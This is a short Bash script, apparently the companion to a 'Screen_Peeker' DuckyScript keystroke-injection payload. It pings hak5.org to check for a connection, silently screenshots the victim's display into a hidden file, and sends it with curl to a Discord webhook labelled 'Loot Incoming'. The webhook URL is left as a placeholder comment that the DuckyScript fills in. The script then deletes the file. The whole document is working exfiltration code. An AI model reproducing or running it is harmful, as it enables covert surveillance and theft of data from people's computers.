# Screen_Peeker Bash script to accompany Screen_Peeker DuckyScript payload.txt
# Checks to see if internet connectivity is present, captures screenshot, and exfiltrates via Discord webhook.
#!/bin/bash
net_check() {
	ping -c 1 hak5.org
}
user="$(whoami)"

if net_check; then
	xfce4-screenshooter --display=:0 -f -m -s ~/.screen_peeker.png
	curl -X POST -H "Content-Type: multipart/form-data" \
	-F "file=@/home/$user/.screen_peeker.png" \
    -F "content=$ Loot Incoming $" \
# DISCORD WEBHOOK PLACED HERE VIA DUCKYSCRIPT.
	rm ~/.screen_peeker.png
else
    exit 0
fi
